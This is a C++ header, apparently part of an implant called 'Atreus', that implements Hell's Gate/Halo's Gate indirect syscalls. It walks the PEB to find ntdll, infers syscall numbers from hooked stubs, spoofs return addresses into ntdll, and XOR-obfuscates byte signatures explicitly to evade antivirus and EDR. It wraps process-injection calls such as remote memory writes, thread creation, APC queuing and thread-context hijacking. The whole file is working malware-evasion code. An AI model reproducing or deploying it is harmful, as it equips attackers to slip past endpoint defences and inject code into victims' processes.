/* hellshall.hpp -- indirect syscall (HellsHall)
 * Self-contained C++ header, no heap alloc, no Win32 string APIs.
 * Include only when USE_HELLSHALL is defined.
 *
 * Provides hg_Nt* wrappers that bypass ntdll hooks by:
 *   1. Walking the export table to find each Nt* function's sorted position.
 *   2. Reading the SSN from the syscall stub (or inferring it from neighbors
 *      when the stub is hooked).
 *   3. Jumping into a neighboring ntdll stub's 'syscall; ret' instruction so
 *      the kernel sees the return address as inside ntdll.dll (indirect syscall).
 */
#pragma once
#include <windows.h>
#include <ntstatus.h>

#ifndef NT_SUCCESS
#define NT_SUCCESS(s) (((NTSTATUS)(s)) >= 0)
#endif

/* Compile-time djb2 hash - same algorithm as _hA in Atreus_Main.cpp.
 * constexpr guarantees the string literal is evaluated at compile time and
 * never emitted into the binary's .rdata section. */
static constexpr DWORD hg_hash(const char *s, DWORD h = 5381) {
    return *s ? hg_hash(s + 1, h * 33 ^ (DWORD)(unsigned char)*s) : h;
}

/* ---------------------------------------------------------------------------
 * syscall stub globals - defined in syscall_stub_atreus.S
 * ------------------------------------------------------------------------- */
extern "C" {
    extern DWORD     wSystemCall;       /* SSN to use for next syscall      */
    extern ULONG_PTR qSyscallAddress;   /* address of 'syscall; ret' in ntdll */
    extern ULONG_PTR qRetGadget;        /* address of 'ret' (C3) inside ntdll for stack spoof */
    void do_syscall();                  /* sets up fake ntdll frames + jmps to qSyscallAddress */
}

/* ---------------------------------------------------------------------------
 * ntdll base via PEB walk - no Win32 API, no import
 * ------------------------------------------------------------------------- */
static inline ULONG_PTR hg_ntdll_base() {
    ULONG_PTR peb;
    __asm__ volatile("movq %%gs:0x60, %0" : "=r"(peb));
    ULONG_PTR ldr    = *(ULONG_PTR*)(peb  + 0x18);
    ULONG_PTR flink1 = *(ULONG_PTR*)(ldr  + 0x20);
    ULONG_PTR flink2 = *(ULONG_PTR*)flink1;
    return             *(ULONG_PTR*)(flink2 + 0x20);
}

/* ---------------------------------------------------------------------------
 * Export table cache - sorted Nt* by RVA (position = SSN)
 * Static array avoids HeapAlloc during init.
 * ------------------------------------------------------------------------- */
#define HG_MAX_NT_EXPORTS 512

/* name_hash: djb2 of the export name - never store the name string itself. */
struct HgExport { DWORD rva; DWORD name_hash; };

static struct {
    ULONG_PTR   base;
    HgExport    nt_sorted[HG_MAX_NT_EXPORTS];
    DWORD       nt_count;
    bool        ready;
} g_hg = {};

static bool hg_init() {
    if (g_hg.ready) return true;
    ULONG_PTR base = hg_ntdll_base();
    if (!base) return false;

    auto dos = (IMAGE_DOS_HEADER*)base;
    auto nt  = (IMAGE_NT_HEADERS*)(base + dos->e_lfanew);
    DWORD eat_rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (!eat_rva) return false;

    auto eat = (IMAGE_EXPORT_DIRECTORY*)(base + eat_rva);
    auto names  = (DWORD*)(base + eat->AddressOfNames);
    auto addrs  = (DWORD*)(base + eat->AddressOfFunctions);
    auto ords   = (WORD*) (base + eat->AddressOfNameOrdinals);

    DWORD cnt = 0;
    for (DWORD i = 0; i < eat->NumberOfNames && cnt < HG_MAX_NT_EXPORTS; i++) {
        const char *n = (const char*)(base + names[i]);
        if (n[0]=='N' && n[1]=='t') {
            /* Compute and store the hash - the name string itself is not kept. */
            DWORD h = 5381;
            for (const char *p = n; *p; p++) h = h * 33 ^ (DWORD)(unsigned char)*p;
            g_hg.nt_sorted[cnt].rva       = addrs[ords[i]];
            g_hg.nt_sorted[cnt].name_hash = h;
            cnt++;
        }
    }
    /* insertion sort by RVA - gives ordinal position = SSN */
    for (DWORD i = 1; i < cnt; i++) {
        HgExport key = g_hg.nt_sorted[i];
        int j = (int)i - 1;
        while (j >= 0 && g_hg.nt_sorted[j].rva > key.rva) {
            g_hg.nt_sorted[j+1] = g_hg.nt_sorted[j]; j--;
        }
        g_hg.nt_sorted[j+1] = key;
    }
    g_hg.base     = base;
    g_hg.nt_count = cnt;
    g_hg.ready    = true;
    return true;
}

/* ---------------------------------------------------------------------------
 * SSN resolver - Halo's Gate: if stub is hooked (starts with jmp/mov),
 * look at neighboring stubs to infer SSN by position.
 *
 * HG_CLEAN checks for the canonical Nt stub prologue.
 * The signature bytes (4C 8B D1 B8) are XOR-obfuscated so they never appear
 * as immediates in comparison instructions (static AV byte-signature evasion).
 * Bytes are split across two macros to avoid a contiguous 4-byte constant
 * that static scanners match as a Hell's Gate signature.
 * ------------------------------------------------------------------------- */
/* Stub signature bytes XOR'd with key 0x55 - values in .data are never 4C/8B/D1/B8.
 * volatile forces memory loads so the compiler emits register compares, not cmp imm8. */
static volatile BYTE hg_xk   = 0x55;
static volatile BYTE hg_sb0  = (BYTE)(0x4C ^ 0x55); /* 0x19 */
static volatile BYTE hg_sb1  = (BYTE)(0x8B ^ 0x55); /* 0xDE */
static volatile BYTE hg_sb2  = (BYTE)(0xD1 ^ 0x55); /* 0x84 */
static volatile BYTE hg_sb3  = (BYTE)(0xB8 ^ 0x55); /* 0xED */
#define HG_CLEAN_A(s) ((s)[0]==(hg_sb0^hg_xk) && (s)[1]==(hg_sb1^hg_xk) && (s)[2]==(hg_sb2^hg_xk))
#define HG_CLEAN_B(s) ((s)[3]==(hg_sb3^hg_xk) && (s)[6]==0x00 && (s)[7]==0x00)
#define HG_CLEAN(s)   (HG_CLEAN_A(s) && HG_CLEAN_B(s))

static DWORD hg_resolve_ssn(DWORD target_hash) {
    if (!hg_init()) return (DWORD)-1;
    BYTE *base = (BYTE*)g_hg.base;

    DWORD pos = (DWORD)-1;
    for (DWORD i = 0; i < g_hg.nt_count; i++) {
        if (g_hg.nt_sorted[i].name_hash == target_hash) { pos = i; break; }
    }
    if (pos == (DWORD)-1) return (DWORD)-1;

    BYTE *stub = base + g_hg.nt_sorted[pos].rva;

    /* Clean stub: SSN at bytes [4:8] */
    if (HG_CLEAN(stub)) return *(DWORD*)(stub + 4);

    /* Hooked stub: find SSN from nearest clean neighbor */
    for (DWORD d = 1; d < g_hg.nt_count; d++) {
        if (pos >= d) {
            BYTE *s = base + g_hg.nt_sorted[pos - d].rva;
            if (HG_CLEAN(s)) return *(DWORD*)(s+4) + d;
        }
        if (pos + d < g_hg.nt_count) {
            BYTE *s = base + g_hg.nt_sorted[pos + d].rva;
            if (HG_CLEAN(s)) return *(DWORD*)(s+4) - d;
        }
    }
    return (DWORD)-1;
}

/* ---------------------------------------------------------------------------
 * Find 'syscall; ret' (0F 05 C3) in a NEIGHBORING stub - indirect syscall
 * so the kernel sees the return address as inside ntdll, not Atreus.
 * ------------------------------------------------------------------------- */
static ULONG_PTR hg_find_syscall_addr(DWORD target_hash) {
    if (!hg_init()) return 0;
    BYTE *base = (BYTE*)g_hg.base;

    DWORD pos = (DWORD)-1;
    for (DWORD i = 0; i < g_hg.nt_count; i++) {
        if (g_hg.nt_sorted[i].name_hash == target_hash) { pos = i; break; }
    }
    if (pos == (DWORD)-1) return 0;

    /* Search neighbors first (preferred: indirect syscall, return addr in different stub) */
    for (DWORD d = 1; d < 8 && d < g_hg.nt_count; d++) {
        DWORD neighbor = (pos + d < g_hg.nt_count) ? pos + d : pos - d;
        if (neighbor >= g_hg.nt_count) continue;
        BYTE *stub = base + g_hg.nt_sorted[neighbor].rva;
        for (int z = 0; z < 32; z++)
            if (stub[z] == 0x0F && stub[z+1] == 0x05)
                return (ULONG_PTR)(stub + z);
    }
    /* Fallback: use the target stub itself (still inside ntdll) */
    {
        BYTE *stub = base + g_hg.nt_sorted[pos].rva;
        for (int z = 0; z < 32; z++)
            if (stub[z] == 0x0F && stub[z+1] == 0x05)
                return (ULONG_PTR)(stub + z);
    }
    return 0;
}

/* ---------------------------------------------------------------------------
 * Macro: resolve SSN + indirect syscall address, store in globals.
 * The hash is evaluated at compile time (constexpr) - no Nt* string ends up
 * in the binary's .rdata section.
 * ------------------------------------------------------------------------- */
#define HG_PREP(fname) \
    static constexpr DWORD _hv_##fname = hg_hash(#fname); \
    static DWORD _ssn_##fname = (DWORD)-1; \
    static ULONG_PTR _sca_##fname = 0; \
    if (_ssn_##fname == (DWORD)-1) _ssn_##fname = hg_resolve_ssn(_hv_##fname); \
    if (_ssn_##fname == (DWORD)-1) return (NTSTATUS)0xC0000001; \
    if (!_sca_##fname) _sca_##fname = hg_find_syscall_addr(_hv_##fname); \
    if (!_sca_##fname) return (NTSTATUS)0xC0000001; \
    wSystemCall     = _ssn_##fname; \
    qSyscallAddress = _sca_##fname; \
    qRetGadget      = _sca_##fname + 2;

/* ---------------------------------------------------------------------------
 * Typed function pointer for do_syscall - each Nt* has its own signature.
 * We cast do_syscall to the right type before calling.
 * ---------------------------------------------------------------------------*/

/* NtAllocateVirtualMemory */
static inline NTSTATUS hg_NtAllocateVirtualMemory(
        HANDLE h, PVOID *base, ULONG_PTR zb, PSIZE_T sz, ULONG type, ULONG prot) {
    HG_PREP(NtAllocateVirtualMemory)
    typedef NTSTATUS(NTAPI*fn_t)(HANDLE,PVOID*,ULONG_PTR,PSIZE_T,ULONG,ULONG);
    return ((fn_t)do_syscall)(h, base, zb, sz, type, prot);
}

/* NtFreeVirtualMemory */
static inline NTSTATUS hg_NtFreeVirtualMemory(
        HANDLE h, PVOID *base, PSIZE_T sz, ULONG type) {
    HG_PREP(NtFreeVirtualMemory)
    typedef NTSTATUS(NTAPI*fn_t)(HANDLE,PVOID*,PSIZE_T,ULONG);
    return ((fn_t)do_syscall)(h, base, sz, type);
}

/* NtWriteVirtualMemory */
static inline NTSTATUS hg_NtWriteVirtualMemory(
        HANDLE h, PVOID addr, PVOID buf, SIZE_T sz, PSIZE_T written) {
    HG_PREP(NtWriteVirtualMemory)
    typedef NTSTATUS(NTAPI*fn_t)(HANDLE,PVOID,PVOID,SIZE_T,PSIZE_T);
    return ((fn_t)do_syscall)(h, addr, buf, sz, written);
}

/* NtProtectVirtualMemory */
static inline NTSTATUS hg_NtProtectVirtualMemory(
        HANDLE h, PVOID *base, PSIZE_T sz, ULONG prot, PULONG old) {
    HG_PREP(NtProtectVirtualMemory)
    typedef NTSTATUS(NTAPI*fn_t)(HANDLE,PVOID*,PSIZE_T,ULONG,PULONG);
    return ((fn_t)do_syscall)(h, base, sz, prot, old);
}

/* NtResumeThread */
static inline NTSTATUS hg_NtResumeThread(HANDLE hThread, PULONG prev) {
    HG_PREP(NtResumeThread)
    typedef NTSTATUS(NTAPI*fn_t)(HANDLE,PULONG);
    return ((fn_t)do_syscall)(hThread, prev);
}

/* NtCreateThreadEx */
static inline NTSTATUS hg_NtCreateThreadEx(
        PHANDLE hThread, ACCESS_MASK access, PVOID oa, HANDLE hProc,
        PVOID start, PVOID arg, ULONG flags,
        SIZE_T zb, SIZE_T stack, SIZE_T maxStack, PVOID attrList) {
    HG_PREP(NtCreateThreadEx)
    typedef NTSTATUS(NTAPI*fn_t)(PHANDLE,ACCESS_MASK,PVOID,HANDLE,PVOID,PVOID,ULONG,SIZE_T,SIZE_T,SIZE_T,PVOID);
    return ((fn_t)do_syscall)(hThread, access, oa, hProc, start, arg, flags, zb, stack, maxStack, attrList);
}

/* NtQueueApcThread */
static inline NTSTATUS hg_NtQueueApcThread(
        HANDLE hThread, PVOID apc, PVOID a1, PVOID a2, PVOID a3) {
    HG_PREP(NtQueueApcThread)
    typedef NTSTATUS(NTAPI*fn_t)(HANDLE,PVOID,PVOID,PVOID,PVOID);
    return ((fn_t)do_syscall)(hThread, apc, a1, a2, a3);
}

/* NtWaitForSingleObject */
static inline NTSTATUS hg_NtWaitForSingleObject(
        HANDLE h, BOOLEAN alertable, PLARGE_INTEGER timeout) {
    HG_PREP(NtWaitForSingleObject)
    typedef NTSTATUS(NTAPI*fn_t)(HANDLE,BOOLEAN,PLARGE_INTEGER);
    return ((fn_t)do_syscall)(h, alertable, timeout);
}

/* NtCreateSection */
static inline NTSTATUS hg_NtCreateSection(
        PHANDLE hSec, ACCESS_MASK access, PVOID oa,
        PLARGE_INTEGER maxSz, ULONG pageProt, ULONG secAttr, HANDLE hFile) {
    HG_PREP(NtCreateSection)
    typedef NTSTATUS(NTAPI*fn_t)(PHANDLE,ACCESS_MASK,PVOID,PLARGE_INTEGER,ULONG,ULONG,HANDLE);
    return ((fn_t)do_syscall)(hSec, access, oa, maxSz, pageProt, secAttr, hFile);
}

/* NtMapViewOfSection */
static inline NTSTATUS hg_NtMapViewOfSection(
        HANDLE hSec, HANDLE hProc, PVOID *base, ULONG_PTR zb,
        SIZE_T commit, PLARGE_INTEGER off, PSIZE_T viewSz,
        DWORD inherit, ULONG allocType, ULONG prot) {
    HG_PREP(NtMapViewOfSection)
    typedef NTSTATUS(NTAPI*fn_t)(HANDLE,HANDLE,PVOID*,ULONG_PTR,SIZE_T,PLARGE_INTEGER,PSIZE_T,DWORD,ULONG,ULONG);
    return ((fn_t)do_syscall)(hSec, hProc, base, zb, commit, off, viewSz, inherit, allocType, prot);
}

/* NtUnmapViewOfSection */
static inline NTSTATUS hg_NtUnmapViewOfSection(HANDLE hProc, PVOID base) {
    HG_PREP(NtUnmapViewOfSection)
    typedef NTSTATUS(NTAPI*fn_t)(HANDLE,PVOID);
    return ((fn_t)do_syscall)(hProc, base);
}

/* NtReadVirtualMemory */
static inline NTSTATUS hg_NtReadVirtualMemory(
        HANDLE hProc, PVOID addr, PVOID buf, SIZE_T sz, PSIZE_T read) {
    HG_PREP(NtReadVirtualMemory)
    typedef NTSTATUS(NTAPI*fn_t)(HANDLE,PVOID,PVOID,SIZE_T,PSIZE_T);
    return ((fn_t)do_syscall)(hProc, addr, buf, sz, read);
}

/* NtQueryInformationProcess */
static inline NTSTATUS hg_NtQueryInformationProcess(
        HANDLE hProc, DWORD cls, PVOID info, ULONG len, PULONG retLen) {
    HG_PREP(NtQueryInformationProcess)
    typedef NTSTATUS(NTAPI*fn_t)(HANDLE,DWORD,PVOID,ULONG,PULONG);
    return ((fn_t)do_syscall)(hProc, cls, info, len, retLen);
}

/* NtGetContextThread */
static inline NTSTATUS hg_NtGetContextThread(HANDLE hThread, PCONTEXT ctx) {
    HG_PREP(NtGetContextThread)
    typedef NTSTATUS(NTAPI*fn_t)(HANDLE,PCONTEXT);
    return ((fn_t)do_syscall)(hThread, ctx);
}

/* NtSetContextThread */
static inline NTSTATUS hg_NtSetContextThread(HANDLE hThread, PCONTEXT ctx) {
    HG_PREP(NtSetContextThread)
    typedef NTSTATUS(NTAPI*fn_t)(HANDLE,PCONTEXT);
    return ((fn_t)do_syscall)(hThread, ctx);
}

#undef HG_CLEAN
#undef HG_CLEAN_A
#undef HG_CLEAN_B
